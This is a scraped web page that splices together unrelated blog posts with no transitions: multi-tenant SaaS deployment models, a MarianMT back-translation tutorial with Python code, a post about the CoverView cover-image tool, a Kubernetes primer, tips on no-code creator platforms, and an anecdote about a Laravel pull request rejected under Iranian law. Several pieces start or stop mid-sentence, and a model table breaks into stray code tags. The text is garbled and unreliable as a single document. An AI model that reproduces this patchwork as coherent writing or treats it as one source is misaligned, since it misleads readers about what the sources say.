personalities.</p><p>If you are able …</p></div></div>

<p><img data-original-height="392" data-original-width="1176" src="https://1.bp.blogspot.com/-c8iAON90hE8/X0u6DaURFlI/AAAAAAAAEzI/dENaZvr7StEWfYHQXURz4wBd_D_XA73bACLcBGAsYHQ/s640/multitenancy.png" width="640"></p>


<p>Multi-tenancy Application Deployment Architecture could be modeled in 4 broad ways:</p>

<ol>
	<li>Separate Apps &amp; Separate Databases</li>
	<li>Shared Apps &amp; Shared Databases</li>
	<li>Separate Apps &amp; Shared Databases</li>
	<li>Shared Apps &amp; Separate Databases</li>
</ol>
<p>There is no right or wrong here. It's about choice and consequence that you should consider taking into your business context and constraints. In this post I intend to jot down a some key points to keep in mind for each of these multi-tenant architecture.&nbsp;</p>

<h4>Separate Apps &amp; Separate Databases</h4>
<div>
	<ul>
		<li>Easiest to implement from development and deployment stand-point.</li>
		<li>Just automate the deployment infrastructure for every tenant for quick set-up.</li>
		<li>Most expensive of all the models from infrastructure cost stand-point.</li><li>Relatively longer deployment time for newer application versions, at scale.&nbsp;</li><li>More wastage from infrastructure resource utilization point of view.</li>
		<li>The application's statelessness criteria for scalability would mean:
			<ul><li>not holding user-request data</li></ul>
		</li>
		<li>Suitability:
		<ul>
			<li>This is the best way to begin your SAAS platform, for product-market fitment until stability and growth.</li>
			<li>When you provide SAAS as white-labelled product.</li>
			<li>When you deploy your SAAS product at client infrastructure, maybe for compliance reasons.</li>
		</ul></li>
		<li>Challenges:
		<ul>
			<li>How do you optimize resources for cost?</li>
		</ul></li>
	</ul>
</div>

<h4>Shared Apps &amp; Shared Databases</h4>
<div>
	<ul>
		<li>The most complex beast of all the multi-tenancy architectures.</li>
		<li>Maximizing infra utilization every bit for maximum profitability.&nbsp;</li>
		<li>Challenges:&nbsp;&nbsp;</li>
		<ul>
			<li>How do you manage as volume of transactions&nbsp; and data increases? The relational database by its virtue is vertically scalable and not horizontally scalable. Now this means it could become a bottleneck sooner than you think as you onboard more and more tenants, depending on the volume of transactions and data.</li>
			<li>In case of SaaS apps that provides lot of customizations on the UI, how do you get this tenant specific configuration optimally for latency? <a href="https://www.wix.com/ecommerce/website" target="_blank">Wix eCommerce</a>, <a href="https://www.shopify.in/tour/ecommerce-website" target="_blank">Shopify</a>, etc.</li>
		</ul>
	</ul>
</div>

<h4>Separate Apps &amp; Shared Databases</h4>
<div>
	<ul>
		<li>A model where tenant specific configuration are tied to deployed instances, but all share a common database. The data isolation per client is achieved by prefixing database schema with tenant info.&nbsp;</li>
		<li>You got many web-frameworks and web-plugins supporting this model of prefixing-queries with tenant specific data, to hit the right datasource. For example, <a href="https://github.com/influitive/apartment" target="_blank">apartment</a> (rails/ruby), <a href="https://github.com/tenancy/multi-tenant" target="_blank">multi-tenant</a> (laravel/php), springboot (java), etc.</li>
		<li>Relational database instances are expensive. It way pricier than your application instances and is not as disposable as your compute instances can are. You got to do a bit of forward looking into future for its capacity planning.</li>
		<li>When you are managing your database instance as a SaaS provider and want to optimize on the overall cost, often the easiest thing to do is use shared database.</li>
		<li>The application's statelessness criteria for scalability would mean:</li>
		<ul>
			<li>not holding user-request data</li>
			<li>not holding database-responses</li>
		</ul>
		<li>Challenges:&nbsp;</li>
		<ul>
			<li>How do you manage as volume of transactions&nbsp; and data increases? The relational database by its virtue is vertically scalable and not horizontally scalable. Now this means it could become a bottleneck sooner than you think as you onboard more and more tenants, depending on the volume of transactions and data.</li>
		</ul>
	</ul>
	<br>
</div>
<h4>Shared Apps &amp; Separate Databases</h4>
<div>
	<ul>
		<li>A request can hit any of the available application instance.</li>
		<li>Tenant specific configuration is got dynamically with every request.</li>
		<li>The application's statelessness criteria for scalability would mean:</li>
		<ul>
			<li>not holding user-request data</li>
			<li>not holding tenant's configuration</li>
			<li>not holding database-responses</li>
		</ul>
		<li>Challenges:&nbsp;</li>
		<ul>
			<li>How do you hit the right database dynamically on a per request basis? How do you do it optimally for latency? Think&nbsp; of Atlassian suite of products like <a href="https://www.atlassian.com/software/confluence" target="_blank">Confluence</a>, <a href="https://www.atlassian.com/software/jira/agile" target="_blank">Jira</a>, <a href="https://www.atlassian.com/software/bitbucket" target="_blank">Bitbucket </a>etc.</li>
			<li>In case of SaaS apps that provides lot of customization on the UI, how do you get this tenant specific configuration optimally for latency? <a href="https://www.wix.com/ecommerce/website" target="_blank">Wix eCommerce</a>, <a href="https://www.shopify.in/tour/ecommerce-website" target="_blank">Shopify</a>, etc.</li>
		</ul>
	</ul><p>Hope that helps you in your design choice for your SAAS architecture...</p>

<section itemprop="text">
<p>Hugging Face recently released <a href="https://huggingface.co/models?search=Helsinki-NLP%2Fopus-mt">1008 translation models</a> for almost 140 languages on their model hub.</p>
<p>These models were originally trained by <a href="https://researchportal.helsinki.fi/en/persons/j%C3%B6rg-tiedemann">Jörg Tiedemann</a> of the <a href="https://blogs.helsinki.fi/language-technology/">Language Technology Research Group at the University of Helsinki</a>. They were trained on the <a href="http://opus.nlpl.eu/">Open Parallel Corpus(OPUS)</a> using a neural machine translation framework called <a href="https://marian-nmt.github.io/">MarianNMT</a>.</p>
<p>In this post, I will explain how you can use the MarianMT models to augment data text data.</p>
<h2 id="back-translation">Back Translation</h2>
<p>We will use a data augmentation technique called “Back Translation”. In this, we take an original text written in English. Then, we convert it into another language (eg. French) using MarianMT. We translate the French text back into English using MarianMT. We keep the back-translated English text if it is different from the original English sentence.</p>
<p><img src="https://amitness.com/images/back-translation-marianmt.png" alt="Backtranslation with MarianMT"></p>
<h2 id="augmentation-process-">Augmentation Process <a href="https://colab.research.google.com/drive/1J_KpNYj03gecT0p9s6YeDcDJHKgPn1Hh?usp=sharing"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"></a></h2>
<p>First, we need to install Hugging Face transformers and Moses Tokenizers with the following command</p>
<div><div><pre><code>pip <span>install</span> <span>-U</span> transformers 
pip <span>install </span>mosestokenizer
</code></pre></div></div>
<p>After installation, we can now import the MarianMT model and tokenizer.</p>
<div><div><pre><code><span>from</span> <span>transformers</span> <span>import</span> <span>MarianMTModel</span><span>,</span> <span>MarianTokenizer</span>
</code></pre></div></div>
<p>Then, we can create a initialize the model that can translate from English to Romance languages. This is a single model that can translate to any of the romance languages()</p>
<div><div><pre><code><span>target_model_name</span> <span>=</span> <span>'Helsinki-NLP/opus-mt-en-ROMANCE'</span>
<span>target_tokenizer</span> <span>=</span> <span>MarianTokenizer</span><span>.</span><span>from_pretrained</span><span>(</span><span>target_model_name</span><span>)</span>
<span>target_model</span> <span>=</span> <span>MarianMTModel</span><span>.</span><span>from_pretrained</span><span>(</span><span>target_model_name</span><span>)</span>
</code></pre></div></div>
<p>Similarly, we can initialize models that can translate Romance languages to English.</p>
<div><div><pre><code><span>en_model_name</span> <span>=</span> <span>'Helsinki-NLP/opus-mt-ROMANCE-en'</span>
<span>en_tokenizer</span> <span>=</span> <span>MarianTokenizer</span><span>.</span><span>from_pretrained</span><span>(</span><span>en_model_name</span><span>)</span>
<span>en_model</span> <span>=</span> <span>MarianMTModel</span><span>.</span><span>from_pretrained</span><span>(</span><span>en_model_name</span><span>)</span>
</code></pre></div></div>
<p>Next, we write a helper function to translate a batch of text given the machine translation model, tokenizer and the target romance language.</p>
<div><div><pre><code><span>def</span> <span>translate</span><span>(</span><span>texts</span><span>,</span> <span>model</span><span>,</span> <span>tokenizer</span><span>,</span> <span>language</span><span>=</span><span>"fr"</span><span>):</span>
    <span># Prepare the text data into appropriate format for the model
</span>    <span>template</span> <span>=</span> <span>lambda</span> <span>text</span><span>:</span> <span>f"</span><span>{</span><span>text</span><span>}</span><span>"</span> <span>if</span> <span>language</span> <span>==</span> <span>"en"</span> <span>else</span> <span>f"</span><span>{</span><span>language</span><span>}</span><span>&lt;&lt; </span><span>{</span><span>text</span><span>}</span><span>"</span>
    <span>src_texts</span> <span>=</span> <span>[</span><span>template</span><span>(</span><span>text</span><span>)</span> <span>for</span> <span>text</span> <span>in</span> <span>texts</span><span>]</span>

    <span># Tokenize the texts
</span>    <span>encoded</span> <span>=</span> <span>tokenizer</span><span>.</span><span>prepare_translation_batch</span><span>(</span><span>src_texts</span><span>)</span>
    
    <span># Generate translation using model
</span>    <span>translated</span> <span>=</span> <span>model</span><span>.</span><span>generate</span><span>(</span><span>**</span><span>encoded</span><span>)</span>

    <span># Convert the generated tokens indices back into text
</span>    <span>translated_texts</span> <span>=</span> <span>tokenizer</span><span>.</span><span>batch_decode</span><span>(</span><span>translated</span><span>,</span> <span>skip_special_tokens</span><span>=</span><span>True</span><span>)</span>
    
    <span>return</span> <span>translated_texts</span>
</code></pre></div></div>
<p>Next, we will prepare a function to use the above <code>translate()</code> function to perform back translation.</p>
<div><div><pre><code><span>def</span> <span>back_translate</span><span>(</span><span>texts</span><span>,</span> <span>target_lang</span><span>=</span><span>"fr"</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>):</span>
    <span># Translate from source to target language
</span>    <span>fr_texts</span> <span>=</span> <span>translate</span><span>(</span><span>texts</span><span>,</span> <span>target_model</span><span>,</span> <span>target_tokenizer</span><span>,</span> 
                         <span>language</span><span>=</span><span>target_lang</span><span>)</span>

    <span># Translate from target language back to source language
</span>    <span>back_translated_texts</span> <span>=</span> <span>translate</span><span>(</span><span>fr_texts</span><span>,</span> <span>en_model</span><span>,</span> <span>en_tokenizer</span><span>,</span> 
                                      <span>language</span><span>=</span><span>source_lang</span><span>)</span>
    
    <span>return</span> <span>back_translated_texts</span>
</code></pre></div></div>
<p>Now, we can perform data augmentation using back-translation from English to Spanish on a list of sentences as shown below.</p>
<div><div><pre><code><span>en_texts</span> <span>=</span> <span>[</span><span>'This is so cool'</span><span>,</span> <span>'I hated the food'</span><span>,</span> <span>'They were very helpful'</span><span>]</span>

<span>aug_texts</span> <span>=</span> <span>back_translate</span><span>(</span><span>en_texts</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>,</span> <span>target_lang</span><span>=</span><span>"es"</span><span>)</span>
<span>print</span><span>(</span><span>aug_texts</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code><span>[</span><span>"Yeah, it's so cool."</span><span>,</span> <span>"It's the food I hated."</span><span>,</span> <span>'They were of great help.'</span><span>]</span>
</code></pre></div></div>
<p>Similarly, we can perform augmentation using English to French as shown below with the exact same helper method.</p>
<div><div><pre><code><span>en_texts</span> <span>=</span> <span>[</span><span>'This is so cool'</span><span>,</span> <span>'I hated the food'</span><span>,</span> <span>'They were very helpful'</span><span>]</span>
<span>aug_texts</span> <span>=</span> <span>back_translate</span><span>(</span><span>en_texts</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>,</span> <span>target_lang</span><span>=</span><span>"fr"</span><span>)</span>

<span>print</span><span>(</span><span>aug_texts</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code><span>[</span><span>"It's so cool."</span><span>,</span> <span>'I hated food.'</span><span>,</span> <span>"They've been very helpful."</span><span>]</span>
</code></pre></div></div>
<h2 id="chained-back-translation">Chained Back Translation</h2>
<p>You can also run back translation in a chain to get more diversity. For example, <code>English -&gt; Spanish -&gt; English -&gt; French -&gt; English</code></p>
<div><div><pre><code><span>en_texts</span> <span>=</span> <span>[</span><span>'This is so cool'</span><span>,</span> <span>'I hated the food'</span><span>,</span> <span>'They were very helpful'</span><span>]</span>

<span>aug1_texts</span> <span>=</span> <span>back_translate</span><span>(</span><span>en_texts</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>,</span> <span>target_lang</span><span>=</span><span>"es"</span><span>)</span>
<span>aug2_texts</span> <span>=</span> <span>back_translate</span><span>(</span><span>aug1_texts</span><span>,</span> <span>source_lang</span><span>=</span><span>"en"</span><span>,</span> <span>target_lang</span><span>=</span><span>"fr"</span><span>)</span>

<span>print</span><span>(</span><span>aug2_texts</span><span>)</span>
</code></pre></div></div>
<div><div><pre><code>["Yeah, that's cool.", "It's the food I hated.", 'They were of great help.']
</code></pre></div></div>
<h2 id="available-models">Available Models</h2>
<p>Here are language codes for a subset of major romance language that you can use above.</p>
<table>
<thead>
<tr>

</code></pre></div></div>
<h2 id="alternative-applications">Alternative Applications</h2>
<p>Besides data augmentation, the back translation process can also be used for text paraphrasing.</p>
<p>Similarly, we can also use it as an adversarial attack. Suppose we have a training dataset on which we trained an NLP model. Then, we can augment the training dataset and generate prediction from our model on augmented texts. If the predictions are different than our ground-truth labels, then we have a list of texts where our model fails. We can get good insights by analyzing those responses.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Thus, MarianMT is a decent free and offline alternative to Google Translate for back-translation.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598677527863/dI1P7tXJc.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>Do you write blogs?  Have you ever struggled to create cover images for your blogs? 
Well, I did. So I have made a tool that will help you create awesome cover images for your blogs quickly.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598169671591/BKzp2hZnU.png?auto=format&amp;q=60" alt="frame_chrome_mac_dark (1).png"></p>
<h2 id="the-problem">🗃 The problem</h2>
<p>I started blogging a few months back. It's one of the best decisions I have ever made. But every time I wanted to write a post, I had to create and edit a cover image for it. I mean I love creating creative cover images but sometimes I feel I just spend too much time designing it.</p>
<p>And then I saw these comments on my posts.
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598092132300/CLWYZEN_X.png?auto=format&amp;q=60" alt="comments.png"></p>
<p>I use <em>canva</em>. It's a nice tool. But I thought I need something minimal so that creating those cover images won't be any hassle. Coincidently I just started learning <strong>react</strong>. I knew some basics and I thought why not implement my knowledge of react and make something out of it. Also, it might help someone else too. And that's how I came up with the idea of this project.  </p>
<h2 id="the-process">🛠 The process</h2>
<p>I started working on this as a fun project. I had an exact visualization of what I wanted to create. </p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598290323414/bt061ZVRr.png?auto=format&amp;q=60" alt="coverview layout.png"></p>
<p>So I first created a design of a cover image that can be used as the template user can edit. I asked my self what things I would like to add or what can I do to make the cover image more appealing. And I started playing with it. It was fun. After spending a lot of time, solving problems and finding solutions, this is what I came up with the first build.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598290972723/9vlpR1JTN.gif?auto=format,compress&amp;gif-q=60" alt="cover.gif"></p>
<h2 id="the-final-outcome">📦 The final outcome</h2>
<p>I shared it on Twitter and Linkedin and I got a really good response from the developer community. I always wanted to contribute to open source. There are multiple ways to contribute and one of which is creating open-source projects. I open-sourced it. This is my first open-source project with react.</p>
<p><a target="_blank" href="https://github.com/rutikwankhade/CoverView"><img src="https://github-readme-stats.vercel.app/api/pin/?username=rutikwankhade&amp;repo=CoverView" alt="ReadMe Card"></a> </p>
<p>And within a few hours, I got my first pull request. <a target="_blank" href="https://twitter.com/asish_io">Asish Raju</a> made his first open-source contribution by contributing to my project. He added a few more customizable options and refactored the code.</p>
<p>For the first time, I was on the other side of a project. I learned how to manage pull requests, review code, and merged his pull request. <a target="_blank" href="https://opensource.guide/">Open Source Guides</a> is a great resource to learn.</p>
<h2 id="features">Features</h2>
<p>Then I improved it little by little and added some more features. Here are a few noteworthy features of <a target="_blank" href="https://coverview.now.sh/">CoverView</a>.</p>
<ul>
<li>🛠 Create awesome cover images for your blogs quickly and easily</li>
</ul>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598341535630/0Q734Fzbk.png?auto=format&amp;q=60" alt="component (79).png"></p>
<ul>
<li>🌈 Choose different colors for background, foreground, border, and text</li>
</ul>

<ul>
<li>✨ Choose from 15+ different background patterns</li>
</ul>

<ul>
<li>👨‍💻 Add dev icons and author name for personal branding</li>
</ul>

<ul>
<li>💾 Download cover images in <code>.png</code> as well as <code>.jpeg</code> format</li>
</ul>
<p>I just had a lot of fun making this. You might not be able to create a lot more creative images But having a nice cover is always better than having some random image or no cover image at all.</p>
<blockquote>
<p>So check out <a target="_blank" href="https://coverview.now.sh/">CoverView</a></p>
</blockquote>
<h2 id="conclusion">Conclusion</h2>
<p>The important lesson I learned while building this is that you don't need to learn a language or framework completely to start making projects. You can start applying while learning it. I feel this way we can learn from our mistakes and understand the importance of one concept over others. </p>

                <p>At the moment Kubernetes is one of the most exciting technologies in the world of DevOps. Recently a lot of hype has formed around it for one simple reason, and this reason is the mighty containers.</p>
<hr>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/kubernetes-101/kubernetes-101-2.JPG" alt="Infrastructure"></p>
<p>Once upon a time, and it wasn't so long ago, we still ran applications on server hardware. We had a website that spins on a hardware server and a database that stores the website's state. Users visit the site, everything was cool, everything worked.</p>
<p>The website become successful and our company grows. Then the website becomes more and more complex and evolves into a platform with a <a href="https://luminousmen.com/post/thoughts-on-microservices">bunch of services</a>.</p>
<p>Then along came virtual machines (VMs), and we could run multiple operating systems and applications on a single machine. This empowered company to run ten times or more server instances on a single server. But what if we could run even more server programs on a single server if we left behind the bulk of the VM's operating system? That would give us, even bigger cost savings and flexibility. And the containers came along.</p>
<h2>Docker</h2>
<p><img src="https://i.imgur.com/DbqFymX.png" alt="How Docker was born"></p><p>Docker containers have been the de facto development standard for quite some time now, but interestingly enough, Docker is not a pioneer in the container world.</p>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/kubernetes-101/kubernetes-101-3.JPG" alt="History"></p>
<p>Docker is based on namespaces and cgroups technologies (the first one provides isolation, the second one provides process grouping and resource limitation), so in terms of virtualization, it's not much different from LXC/OpenVZ which historically came first. Same native speed, same isolation methods based on Linux kernel machinery. However, at a higher level, it's a very different story. The highlight of Docker is that it allows you to deploy a fully virtual environment, run an application on it, and easily manage it.</p>
<p>Like a virtual machine, the Docker runs its processes in its own pre-configured operating system. However, all the docker processes run on a physical host server sharing the processors and available memory with all the other processes running in the host system. The approach used by the Docker is in the middle between running everything on the physical server and full virtualization offered by virtual machines. This approach is called <em>containerization</em>.</p>
<p><img src="https://iamluminousmen-media.s3.amazonaws.com/media/kubernetes-101/kubernetes-101-4.JPG" alt="Docker internals"></p>
<p>Starting with Linux containers, the excitement moved to Docker containers, while increasing the need for <em>container orchestration</em>.</p>
<p>Back to our story. At some point, the company has realized that the current server is not sufficient, no matter how big it is (vertical scaling). The history moves to the next phase — the company buys more servers and divides the load between them (horizontal scaling).</p>
<p>The IT team tasks are getting harder and harder. They need to bother harder with problems like updates, patches, monitoring, security, backups, durability, reliability, resiliency... which means pagerduty at 6 am on Sunday...</p>
<p>Cloud!</p>
<p>Cool, now all we have to worry about is application logic. But the complexity of the highly available distributed system didn't go anywhere — it's just moved to the complexity of orchestrating and connecting the infrastructure components. Deployments, service discovery, gateway configurations, monitoring, replication, consistency...</p>
<p>It was a short story as we have come to this day. Now we have a distributed system with a bunch of services inside a bunch of containers in the cloud.</p>
<h2>Kubernetes</h2>
<p><em>Don't flatter yourself, even though I've been working with Kubernetes I only know the tip of the iceberg. So here will be not a deep dive, but rather a smooth flight over existing subsystems and concepts.</em></p>
<p>Kubernetes is a sophisticated mechanism designed to make systems scalable, resilient, and easy to deploy. It allows us to automate container orchestration — starting, scaling, managing containerized applications including cluster management, scheduling, service discovery, monitoring, secrets management, and more.</p>
<p>Kubernetes allows to automate the start and rollback of deployments, Kubernetes manages the resources and can scale the required resources for the applications depending on how much they need in order to avoid waste of resources. So k8s essentially is <strong>process automation</strong>. Applications in k8s are rolled out and tested without administrators. The developer writes a script and then the cloud magic happens. So, in the ideal world of Kubernetes, all operational support of the software lies on the shoulders of programmers, and administrators make sure that the layer of cloud infrastructure — that is, Kubernetes itself - works steadily. That's why companies go to the clouds to completely remove the routine of their administration and do only development.</p>
<p>In my opinion, one of the coolest features of Kubernetes is that it helps <strong>standardize the work with Cloud Service Provider</strong>. No matter which CSP we are talking about, working with Kubernetes always looks the same. The developer, in a <strong>declarative manner</strong>, tells the Kubernetes what he needs, and Kubernetes works with system resources, helping the developer to abstract from the implementation details of the platform.</p>
<p>Originally, Kubernetes was a Google project that took into account the shortcomings of <a href="https://research.google/pubs/pub43438/">Borg</a>, the ancestor of Kubernetes. Google uses Kubernetes to manage its gigantic infrastructure of millions of containers. At some point, Google gave the Kubernetes to the world, namely the <a href="https://www.cncf.io/">Cloud Native Computing Foundation</a>. So far, Docker has added the Kubernetes as one of the orchestrators — Kubernetes is now part of the Docker Community and Docker Enterprise Edition.</p>
<p>Kubernetes has many names among which are <em>kube</em> or <em>k8s</em> (I like cool acronyms with numbers and will use it further).</p>
<p>The Kubernetes itself is one huge piece of abstraction. These abstractions are mapped to virtual or physical infrastructure. To understand how it works, we must first understand its basic components.</p>
<h3>Pod</h3>
<p>The pod is the smallest unit that can be launched on a cluster node. It is a group of containers that should work together for some reason. The containers in the pod share port numbers, Linux kernel namespaces, and network stack settings. So when you scale your application within k8s, you should increase the number of pods rather than the number of containers in one particular pod. By <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#restart-policy">default</a> containers inside pods are restarted automatically fixing intermittent problems for you. So even on these basic level k8s keeps your containers running and with a little additional effort, you can tune it to get even more reliability.</p>
<p>Quite often (but not always) there is only one container underneath the pod. But pod abstraction provides additional flexibility when, for example, two containers need to share the same data warehouse, or if there is a connection between them using interprocess communication, or if they are closely connected for some other reason, all this can be implemented by running them in the same pod.</p>
<p>Thus, you can easily draw parallels with existing code primitives and distributed primitives in k8s. Class is a container image, an object is a container instance, a pod is a deployment unit, the composition can be achieved via sidecar pattern, etc.</p>
<p>Another flexibility of pods is that they do not require the use of Docker containers. If necessary, you can also use other application containerization technologies, such as <a href="https://coreos.com/rkt/">rkt</a>.</p>
<h3>Desired state</h3>
<p>The desired state is one of the basic concepts of k8s. You can specify the required state of running pods instead of writing how to achieve that state. For example, if a pod stops working for some reason, k8s will recreate the pod based on the specified desired state.</p>
<p>K8s always checks the state of the containers in the cluster, and this is done by the control loops on the so-called Kubernetes Master, which is part of the control plane. We'll talk about it a bit later.</p>
<h3>Objects in Kubernetes</h3>
<p>An object in k8s is a record of intent — the desired cluster state. And after the object is created, the k8s will constantly check for this object state. In addition, the objects also serve as an additional abstraction layer above the container interface. You can interact with the objects' entities instead of interacting directly with containers.</p>
<p>Almost every k8s object includes two nested object fields that govern the object's configuration: the object spec and the object status.</p>
<p><strong>Pod</strong> that we talked about earlier is just one of the k8s objects.</p>
<p>Pods are mortal — they are born and die but in order to be able to communicate with pods and for them to be able to communicate with each other abstraction of the <strong>Service</strong> has been introduced. Service plays the role of an access point to sets of pods that provide the same functionality as the underlying pods. There are different types of services, ClusterIP, NodePort, LoadBalancer, ExternalName. By default k8s use ClusterIP — it exposes the Service on a cluster-internal IP, so you can only access it using the Kubernetes proxy.</p>
<p>Also for exposing services you can use <strong>Ingress</strong> object. Ingress is not a Service type, but it acts as an entry point for your cluster. Ingress is a description of how traffic should flow from outside the cluster to your services, it acts as a "smart router" or ALB. It allows you to consolidate routing rules into a single resource, as it can aggregate multiple services under a single IP address.</p>
<p>For example, the web application can have a home page at <a href="https://example.com/">https://example.com</a> and a shopping cart at <a href="https://example.com/cart">https://example.com/cart</a> and an API at <a href="https://example.com/api">https://example.com/api</a>. We could implement all of them in one pod, but in order for all of them to scale independently, we could decouple them into different pods and connect to Ingress.</p>
<p>K8s also has a huge number of controllers, such as <strong>ReplicaSet</strong> — it checks that a certain number of copies of pods are running, <strong>StatefulSet</strong> is used with stateful applications and distributed systems, <strong>DemonSet</strong> is used to copy pods to all nodes in the cluster or only to specified nodes, etc. They all implement a control loop — a non-terminating loop that monitors the state of its subsystems, then makes or requests …</p></div></div>

If you're a writer, then your own blog and a strong <a href="https://www.wealest.com/articles/twitter" target="_blank">presence on Twitter</a> maybe your first moves.

I chose it because it's relatively easy to learn, and has a built-in "blog" function that makes writing and publishing content intuitive. Mailchimp handles my weekly <a href="https://www.wealest.com/newsletter" target="_blank">Quick-Reads newsletter</a>, which is also writing based. And Twitter is a natural complement for any writer because it's a word-based platform with 280 characters per tweet. </p><p>What's impressive about Twitter is that the algorithm helps you scale your ideas.

I didn't have one when I started, and I still don't. </p><p>For example, you can be up and running on Twitter in less than 10 minutes with very little technical knowledge. It will take a little longer to build a custom Squarespace site yourself, but nothing crazy. It took me about three weeks to make this version of <a href="https://wealest.com/" target="_blank">Wealest.com</a>, and it hasn't had a significant overhaul since it went live (even though it probably needs one!). </p><p>Squarespace has loads of built-in templates. Once you know the design basics, you can make big changes quickly. Or, you can just pay someone else to build it for you and focus on creating and publishing your work. </p><h3>There Are No-Code Platforms For Almost Everything. </h3><p>If you can imagine it, there is probably a software already built that does it for you. </p><p>For example, <a href="https://www.mightynetworks.com/" target="_blank">Mighty Networks</a> is a platform that lets you to build entire forum communities around your content. You can even create custom courses (video and written) for your audience to purchase.</p><p><a href="https://substack.com/" target="_blank">Substack</a> let's independent writers make a living off their writing with a newsletter / subscription package.</p><p>And <a href="https://www.canva.com/" target="_blank">Canva</a> lets graphic designers build almost any design from scratch or pre-built templates.</p><p>You don't need to know how to code - just choose software and start creating.</p><h3>You Can Expand Your Platforms Over Time.</h3><p>I do recommend starting with just one or two platforms to make it easier to publish consistently. But you can always expand your platforms over time. </p><p>While I only have three main platforms right now, mostly text-based, I plan on adding Instagram, YouTube, and a Podcast in the next year.</p><p>To build an audience, you need to publish. What kinds of stuff should you post?</p><h3>Pick A Niche You’re Interested In Learning More About.</h3><p>You've probably heard the phrase, "write what you know." This is wrong (mostly).</p><p>Yes, you should always try and filter ideas through your unique experience. But that doesn't mean you can't just create content about the cool things you're learning in a particular field.</p><p>That's where I started. Wealest was born out of my hunger to learn the ideas of wealth creators. I didn't know anything about wealth creation before 2016. I just read a lot, filtered those ideas through my unique personality, and wrote about it. </p><p>So, pick something you're interested in and want to learn more about. Then create content around what you learn and how it applies to you.</p><h3>Production Is Better Than Perfection. </h3><p>Your first piece of content probably won't be great. That's ok! </p><p>When you publish consistently, you'll get feedback on what works and what doesn't. This will make your work better over time. Here's what that looks like:</p><p>Create → Publish →  Get Feedback → Iterate → Publish → Get Feedback → Iterate → Publish … and the cycle continues.  </p><p>The key is to keep publishing despite feeling like your work is not good enough. Production is better than perfection. You will get better.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1595629321792_179684"><div><h3>How Often Should You Publish?</h3><p>It depends on what you're creating. I publish one long-form blog post a week, and it takes me about 5 hours from beginning to end. My newsletter also goes out once a week and takes about an hour. </p><p>You don't need to dedicated 20 hours a week to creating stuff and publishing. Find a pace that works for you, and stick with it. Consistency is the key.</p><h3>The Media You Create Has a Zero Marginal Cost of Reproduction.</h3><p>Internet media has a critical intrinsic characteristic that creates an enormous opportunity for creators: there's<strong> no marginal cost to reproduce it. </strong></p><p>Whether one person reads this article, or one million, the cost for me to write it is the same (about 5 hours of my time). Then it<em> </em><strong>scales</strong> without any cost of reproduction on my end to anyone with an internet connection. I write it once, and can then "ship it" to anyone around the world for free. This is the power of internet media. </p><p>No matter what you're interested in, there's someone else who's interested in the same thing you are. That's the incredible power of the internet. So, how do like-minded people find your work?</p><h2>Google Search</h2><p>Google Search is the most effective way to get traffic to your content.

        <h3>Contributing to the Laravel ecosystem</h3><p>This morning I discovered a useful <a href="https://github.com/armancodes/laravel-download-link" rel="noopener noreferrer" target="_blank">Laravel package</a> for generating download links for files, that has some useful features, like expiry time, restricted IP addresses.</p><p>One thing was missing: assigning the DownloadLink for a specific user, so for example when somebody purchases a digital product we can generate a DownloadLink that will only allow him to download the file, and nobody else.</p><p>So I thought this is a good opportunity to contribute to the Laravel ecosystem 💡. I went ahead and <a href="https://github.com/Yiddishe-Kop/laravel-download-link" rel="noopener noreferrer" target="_blank">forked the repo</a>, added the functionality to assign a DownloadLink to a user, &amp; submitted a <a href="https://github.com/armancodes/laravel-download-link/pull/9" rel="noopener noreferrer" target="_blank">pull-request</a> (PR) to the owner of the repo, with a detailed explanation what I'm doing.</p><p>The owner of the repo was very fast, and within an hour already added some more features (assigning DownloadLinks to a list of users) and added tests. This is unlike some <a href="https://github.com/inertiajs/inertia/pull/141" rel="noopener noreferrer" target="_blank">other PRs</a> I opened, that are currently waiting for months...</p><h3>Tehran, Iran</h3><p>Some time later I checked back on the PR, and I was surprised to see that it has been closed, and not merged 😕. I opened it up, and this is what greeted me:</p><blockquote>Hi, Thanks for your great idea. I'm SO SORRY to tell you that I cannot merge this PR. There is a law in my country that we MUST NOT have any relationship with people from Israel or the Israel government. I hope you understand this, and again thanks for your time.</blockquote><p>Turns out he's from Tehran, Iran; and he saw on my <a href="https://github.com/Yiddishe-Kop" rel="noopener noreferrer" target="_blank">GitHub profile</a> that I'm from Jerusalem, Israel.</p><p>I was very surprised and also hurt. This is the first time I experienced the conflict between Israel &amp; Iran first hand. I also never thought that Iran would have has such laws.</p><p>But hey, maybe I'm a Palestinian living in Jerusalem? Or does Iranian law not differentiate?! 🙃 <em>[...aaahhh, my profile name is</em>  <strong>yiddishe-kop</strong> <em>😉]</em></p><p>I thought for a moment how to respond, and this is how I replied:</p><blockquote>That's very sad, @armancodes. I hope one day your country removes this restriction, just like my country has never put such restrictions. However I'm sure that your governments restrictions don't represent your views 🤷‍♂️ . Good luck anyway! 😃</blockquote><h3>What's with the code?</h3><p>I'll probably just have to continue working on my fork of the repo for my own needs, but without being able to collaborate together, it is a loss for the open source community.</p><p>Let's hope that the Iranian people will be freed from their ayatollahs, and be able to collaborate with whoever they want.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
